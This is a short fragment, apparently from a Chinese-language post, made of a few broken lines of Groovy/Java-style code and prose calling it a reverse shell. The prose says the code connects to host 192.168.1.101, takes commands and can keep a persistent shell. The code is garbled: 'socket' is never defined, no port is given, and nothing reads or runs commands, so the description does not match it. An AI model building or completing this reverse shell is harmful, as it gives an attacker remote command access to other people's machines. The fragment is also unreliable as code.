import java.io.\*;

def host = "192.168.1.101"

def out = new PrintWriter(socket.getOutputStream(), true)

这段代码实现了一个反弹 shell，它会连接到指定的主机和端口，并等待来自服务器的命令。

它会将命令作为字符串读入，并在响应中加上 `[COMMAND]` 前缀。

**好了，看了这么多，基本也明白一点了，用这个脚本是可以将建立持久shell的**
